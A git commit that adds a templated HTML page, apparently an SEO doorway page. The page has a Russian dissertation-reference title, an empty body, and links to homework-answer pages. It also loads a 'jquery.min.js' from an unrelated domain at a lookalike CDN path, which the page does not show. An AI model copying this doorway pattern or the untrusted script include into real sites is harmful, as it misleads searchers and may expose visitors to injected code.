bbe0e1c89275059eb1032a21041186c99d6e0306
wendybraun <wendybraun@gkuaisyrsib8fru.ml>
2019-02-11 23:50:37 +0000

    Initial commit

---
+++ azd-lavrentev-g-v-lavrenteva-n-b-slagaemye-tehnologii-modulnogo-obucheniya-barnaul-1994-nauchnaya-biblioteka-dissertaciy-i-avtoreferatov-dissercat-http-www-dissercat-com-content-modulnoe-obuchenie-kak-tselostnaya-sistema-ixzz4h3wp5swj.h
@@ -0,0 +1,140 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Лаврентьев г.в., лаврентьева н.б. слагаемые технологии модульного обучения. барнаул, 1994 научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/modulnoe-obuchenie-kak-tselostnaya-sistema#ixzz4h3wp5swj - xohshu.rna-seq.at</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">xohshu.rna-seq.at</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Лаврентьев г.в., лаврентьева н.б. слагаемые технологии модульного обучения. барнаул, 1994 научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/modulnoe-obuchenie-kak-tselostnaya-sistema#ixzz4h3wp5swj</h2>
+                            </header>
+                            <p></p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="azd-osobennosti-napisaniya-avtobiografii-referat.html">Особенности написания автобиографии реферат</a></li>
+                                <li><a href="azd-resheniya-zadach-iz-zadachnika-kuznecova-l-a-s.html">Решения задач из задачника кузнецова л. а с</a></li>
+                                <li><a href="azd-obrazec-iska-o-vozmeschenii-zatrat-roditeley-na-priobretenie-uchebnikov.html">Образец иска о возмещении затрат родителей на приобретение учебников</a></li>
+                                <li><a href="azd-gdz-golicyn-3-izdanie.html">Гдз голицын 3 издание</a></li>
+                                <li><a href="azd-gdz-millenium-inglish-6.html">Гдз миллениум инглиш 6</a></li>
+                                <li><a href="azd-reshebnik-trigonometriya-10-klass-onlayn.html">Решебник тригонометрия 10 класс онлайн</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="azd-uchebnik-afanaseva-i-miheeva-10-klass-gdz.html">Учебник афанасьева и михеева 10 класс гдз</a></li>
+                                            <li><a href="azd-fizika-sedmoy-klass-samostoyatelnye-kontrolnye-raboty-kirik-gdz.html">Физика седьмой класс самостоятельные контрольные работы кирик гдз</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="azd-gdz-po-rko-7-klass-chudinova.html">Гдз по рко 7 класс чудинова</a></li>
+                                            <li><a href="azd-gdz-z-algebry-8-klass-o-s-ister-2016.html">Гдз з алгебры 8 класс о с истер 2016</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="azd-gdz-po-istorii-rossii-pchelov-7-klass-2014.html">Гдз по истории россии пчелов 7 класс 2014</a></li>
+                                            <li><a href="azd-referat-na-temu-chto-nuzhno-znat-o-spide-profilaktika-rk.html">Реферат на тему что нужно знать о спиде, профилактика рк</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="azd-referat-prirodnye-chrezvychaynye-situacii.html">Реферат природные чрезвычайные ситуации</a></li>
+                                            <li><a href="azd-tugan-telem-sochinenie.html">Туган телем.сочинение</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://ilcf.info/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
